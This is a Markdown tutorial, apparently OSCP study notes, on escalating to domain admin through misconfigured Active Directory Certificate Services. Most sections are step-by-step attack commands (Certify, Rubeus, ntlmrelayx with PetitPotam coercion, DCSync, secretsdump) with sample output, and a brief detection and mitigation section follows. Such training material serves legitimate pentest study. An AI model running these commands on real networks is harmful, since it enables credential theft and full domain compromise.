# Active Directory Certificate Services (ADCS) Exploitation

Complete guide for exploiting misconfigured ADCS to escalate privileges and move laterally in Active Directory environments.

---

## Table of Contents
1. [ADCS Overview](#1-adcs-overview)
2. [Enumeration](#2-enumeration)
3. [ESC1 - Misconfigured Certificate Templates](#3-esc1---misconfigured-certificate-templates)
4. [ESC2 - Subject Alternative Name](#4-esc2---subject-alternative-name)
5. [ESC3 - Enrollment Agent Templates](#5-esc3---enrollment-agent-templates)
6. [ESC4 - Vulnerable Certificate Template ACLs](#6-esc4---vulnerable-certificate-template-acls)
7. [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2](#7-esc6---editf_attributesubjectaltname2)
8. [ESC8 - NTLM Relay to ADCS](#8-esc8---ntlm-relay-to-adcs)
9. [Certificate Authentication](#9-certificate-authentication)
10. [OSCP Practical Examples](#10-oscp-practical-examples)

---

## 1. ADCS Overview

### 1.1 What is ADCS?

**Active Directory Certificate Services:**
- Microsoft PKI implementation
- Issues and manages digital certificates
- Used for authentication, encryption, signing

**Common Uses:**
- Smart card authentication
- SSL/TLS certificates
- Code signing
- Email encryption (S/MIME)
- EFS (Encrypted File System)

---

### 1.2 Key Components

**Certificate Authority (CA):**
- Issues certificates
- Validates certificate requests
- Revokes certificates

**Certificate Templates:**
- Define certificate properties
- Control enrollment permissions
- Specify certificate purpose

**Enterprise CA:**
- Integrated with Active Directory
- Publishes certificates to AD
- Allows auto-enrollment

---

### 1.3 Attack Surface

**Misconfigurations:**
- ESC1: Weak certificate template permissions
- ESC2: Subject Alternative Name abuse
- ESC3: Enrollment agent abuse
- ESC4: Vulnerable template ACLs
- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag
- ESC8: NTLM relay to ADCS HTTP enrollment

**Impact:**
- Privilege escalation
- Lateral movement
- Persistence
- Domain admin compromise

---

## 2. Enumeration

### 2.1 Find Certificate Authorities

**PowerShell:**
```powershell
# List Enterprise CAs
certutil -config - -ping

# Get CA configuration
certutil -dump
```

**Certify (C#):**
```powershell
.\Certify.exe cas

# Output
[*] Enterprise CAs:
    CA Name              : corp-DC01-CA
    DNS Name             : dc01.corp.local
    Certificate Subject  : CN=corp-DC01-CA, DC=corp, DC=local
```

---

### 2.2 Enumerate Certificate Templates

**Certify:**
```powershell
.\Certify.exe find

# Output vulnerable templates
[!] Vulnerable Certificates Templates:
    Template Name         : VulnTemplate
    Schema Version        : 2
    Enrollment Rights     : CORP\Domain Users
    msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
    Enabled               : True
```

**PowerView:**
```powershell
Get-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -LDAPFilter "(objectclass=pKICertificateTemplate)"
```

---

### 2.3 Key Indicators of Vulnerability

**ESC1 Indicators:**
- `msPKI-Certificates-Name-Flag`: ENROLLEE_SUPPLIES_SUBJECT
- Low-privileged enrollment rights
- Authentication EKU (Client Authentication, PKINIT, etc.)

**ESC2 Indicators:**
- Allows Subject Alternative Name (SAN)
- Low-privileged enrollment rights

**ESC6 Indicators:**
- `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled on CA

---

## 3. ESC1 - Misconfigured Certificate Templates

### 3.1 Vulnerability Description

**Requirements:**
1. Template allows low-privileged users to enroll
2. Template allows `ENROLLEE_SUPPLIES_SUBJECT` (user specifies SAN)
3. Template has authentication EKU (e.g., Client Authentication)

**Impact:**
- Request certificate for any user (including Domain Admin)
- Use certificate for authentication

---

### 3.2 Exploitation

**Enumerate Vulnerable Templates:**
```powershell
.\Certify.exe find /vulnerable

# Find ESC1 templates
[!] Template Name: ESC1-Template
    Enrollment Rights: CORP\Domain Users
    msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
    EKU: Client Authentication
```

**Request Certificate as Domain Admin:**
```powershell
.\Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:ESC1-Template /altname:Administrator

# Output
[*] Certificate request successful!
[*] Certificate:
    [Base64 certificate here]
```

**Save Certificate:**
```powershell
# Copy certificate to file
echo "[Base64 cert]" > admin.pem
```

---

### 3.3 Authentication with Certificate

**Rubeus (Kerberos TGT):**
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt

# Output
[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator
[+] TGT request successful!
[*] Ticket injected into current session!
```

**Now:**
```cmd
whoami
# CORP\administrator
```

---

## 4. ESC2 - Subject Alternative Name

### 4.2 Vulnerability Description

**Requirements:**
1. Template allows Any Purpose EKU or no EKU
2. Template allows `ENROLLEE_SUPPLIES_SUBJECT`
3. Low-privileged enrollment

**Impact:**
- Similar to ESC1
- Request certificate for any user

---

### 4.2 Exploitation

**Find ESC2 Templates:**
```powershell
.\Certify.exe find /vulnerable

# Look for:
# - EKU: Any Purpose
# - ENROLLEE_SUPPLIES_SUBJECT: True
```

**Request Certificate:**
```powershell
.\Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:ESC2-Template /altname:Administrator
```

**Authenticate:**
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt
```

---

## 5. ESC3 - Enrollment Agent Templates

### 5.1 Vulnerability Description

**Requirements:**
1. Template allows Certificate Request Agent EKU
2. Another template allows enrollment on behalf of another user

**Attack:**
1. Request Enrollment Agent certificate
2. Use it to request certificate on behalf of Domain Admin

---

### 5.2 Exploitation

**Step 1: Find Enrollment Agent Template**
```powershell
.\Certify.exe find /vulnerable

# Look for:
# EKU: Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)
```

**Step 2: Request Enrollment Agent Certificate**
```powershell
.\Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:EnrollmentAgent
```

**Step 3: Request Certificate on Behalf of Administrator**
```powershell
.\Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:User /onbehalfof:CORP\Administrator /enrollcert:agent.pfx /enrollcertpw:password
```

**Step 4: Authenticate**
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt
```

---

## 6. ESC4 - Vulnerable Certificate Template ACLs

### 6.1 Vulnerability Description

**Requirements:**
- User has `WriteDacl`, `WriteProperty`, or `WriteOwner` on certificate template
- Template has authentication EKU

**Attack:**
1. Modify template to enable ESC1 (add ENROLLEE_SUPPLIES_SUBJECT)
2. Request certificate as Domain Admin
3. Restore template to original state

---

### 6.2 Exploitation

**Find Vulnerable ACLs:**
```powershell
.\Certify.exe find /vulnerable

# Look for:
# Enrollment Rights: CORP\lowpriv (GenericAll, WriteDacl, etc.)
```

**Modify Template (PowerView):**
```powershell
# Enable ENROLLEE_SUPPLIES_SUBJECT
Set-DomainObject -Identity "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Set @{'mspki-certificate-name-flag'=1}
```

**Request Certificate:**
```powershell
.\Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:VulnTemplate /altname:Administrator
```

**Restore Template:**
```powershell
Set-DomainObject -Identity "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Set @{'mspki-certificate-name-flag'=0}
```

---

## 7. ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

### 7.1 Vulnerability Description

**Requirements:**
- `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled on CA
- Template allows low-privileged enrollment
- Template has authentication EKU

**Impact:**
- ANY template can specify SAN (even if not designed to)
- Essentially makes all templates ESC1-vulnerable

---

### 7.2 Check if Enabled

**Certify:**
```powershell
.\Certify.exe cas

# Look for:
# Flags: EDITF_ATTRIBUTESUBJECTALTNAME2
```

**Certutil:**
```cmd
certutil -config "dc01.corp.local\corp-DC01-CA" -getreg "policy\EditFlags"

# Output
# EditFlags REG_DWORD = 0x140014 (1310740)
#   EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
```

---

### 7.3 Exploitation

**Request Certificate with SAN:**
```powershell
.\Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:User /altname:Administrator

# Even though "User" template doesn't allow SAN,
# ESC6 allows it anyway!
```

**Authenticate:**
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt
```

---

## 8. ESC8 - NTLM Relay to ADCS

### 8.1 Vulnerability Description

**Requirements:**
- ADCS HTTP enrollment endpoint enabled
- No EPA (Extended Protection for Authentication)
- SMB signing disabled on target

**Attack:**
1. Coerce authentication from target (e.g., DC)
2. Relay NTLM to ADCS HTTP enrollment
3. Request certificate for target machine
4. Use certificate for authentication

---

### 8.2 Setup

**Check for HTTP Enrollment:**
```bash
# Check if HTTP enrollment enabled
curl -k https://ca.corp.local/certsrv/
```

**Coercion Tools:**
- PetitPotam
- PrinterBug
- DFSCoerce

---

### 8.3 Exploitation

**Step 1: Start ntlmrelayx**
```bash
# Relay to ADCS HTTP enrollment
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Wait for certificate...
```

**Step 2: Coerce Authentication**
```bash
# PetitPotam
python3 PetitPotam.py -d corp.local -u lowpriv -p password attacker-ip dc01.corp.local

# Or PrinterBug
python3 printerbug.py corp.local/lowpriv:password@dc01.corp.local attacker-ip
```

**Step 3: Receive Certificate**
```
[*] HTTPD(80): Authenticating against http://ca.corp.local/certsrv/certfnsh.asp as CORP/DC01$ SUCCEED
[*] Requesting certificate for DC01$...
[*] Certificate received!
[*] Base64 certificate: [...]
```

**Step 4: Authenticate as DC**
```bash
# Request TGT
python3 gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass password corp.local/dc01$ dc01.ccache

# Use TGT
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass dc01.corp.local
```

---

## 9. Certificate Authentication

### 9.1 Rubeus (Windows)

**Request TGT:**
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt

# /ptt: Pass-the-ticket (inject into current session)
```

**Manual Injection:**
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /outfile:admin.kirbi

# Inject
.\Rubeus.exe ptt /ticket:admin.kirbi
```

---

### 9.2 Certipy (Linux)

**Request TGT:**
```bash
certipy auth -pfx admin.pfx -username Administrator -domain corp.local -dc-ip 10.10.10.10

# Output
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] NTLM hash: aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

**Use Credential Cache:**
```bash
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

---

### 9.3 UnPAC-the-Hash

**Extract NTLM Hash from Certificate:**
```bash
# If certificate doesn't grant TGT, use UnPAC
certipy auth -pfx admin.pfx -username Administrator -domain corp.local -dc-ip 10.10.10.10

# Output includes NTLM hash
# Use hash for Pass-the-Hash
```

---

## 10. OSCP Practical Examples

### 10.1 Full ESC1 Exploitation

**Scenario:** Domain user â†’ Domain Admin

**Steps:**
```powershell
# 1. Enumerate CAs
.\Certify.exe cas

# 2. Find vulnerable templates
.\Certify.exe find /vulnerable

# 3. Request certificate as Administrator
.\Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:ESC1-Template /altname:Administrator

# 4. Convert to PFX (if needed)
# Use openssl or Certify.exe to create PFX from PEM

# 5. Request TGT
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt

# 6. DCSync
.\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

---

### 10.2 ESC6 Quick Check

**One-Liner:**
```cmd
certutil -config "dc01.corp.local\corp-DC01-CA" -getreg "policy\EditFlags" | findstr EDITF_ATTRIBUTESUBJECTALTNAME2
```

**If Enabled:**
```powershell
# Request cert for ANY user using ANY template
.\Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:User /altname:Administrator
```

---

### 10.3 ESC8 with Certipy

**All-in-One:**
```bash
# Start relay
certipy relay -ca http://ca.corp.local/certsrv/

# Coerce
certipy shadow auto -u lowpriv@corp.local -p password -account dc01$

# Receive certificate and authenticate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

---

## 11. Tools Summary

| Tool | Purpose | Platform |
|------|---------|----------|
| **Certify** | ADCS enumeration & exploitation | Windows (C#) |
| **Certipy** | All-in-one ADCS toolkit | Linux (Python) |
| **Rubeus** | Kerberos TGT from certificate | Windows (C#) |
| **ForgeCert** | Forge certificates | Windows (C#) |
| **PKINITtools** | Certificate authentication | Linux (Python) |
| **PetitPotam** | Coerce authentication for ESC8 | Windows/Linux |

---

## 12. Detection & Prevention

### 12.1 Blue Team Detection

**Event IDs:**
- 4886: Certificate request received
- 4887: Certificate issued
- 4888: Certificate request denied

**Alerts:**
- Certificate requests with SAN (ESC1/ESC2/ESC6)
- Certificate requests from low-privileged accounts
- Unusual certificate template modifications (ESC4)

---

### 12.2 Mitigation

**Template Hardening:**
```powershell
# Disable ENROLLEE_SUPPLIES_SUBJECT
Set-ADObject -Identity "CN=Template,CN=Certificate Templates,..." -Replace @{'mspki-certificate-name-flag'=0}

# Require manager approval
Set-ADObject -Identity "CN=Template,CN=Certificate Templates,..." -Replace @{'mspki-enrollment-flag'=2}
```

**Disable ESC6:**
```cmd
certutil -config "dc01.corp.local\corp-DC01-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

**Enable EPA (ESC8 mitigation):**
- Configure Extended Protection for Authentication on ADCS web enrollment

---

## 13. References
- Certified Pre-Owned (Whitepaper): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Certify: https://github.com/GhostPack/Certify
- Certipy: https://github.com/ly4k/Certipy
- MITRE ATT&CK: T1649 (Steal or Forge Kerberos Tickets)

---

**OSCP Note:** ESC1 and ESC6 are most common in exam environments. Focus on Certify for enumeration and exploitation. Always check ADCS if you have domain user access!
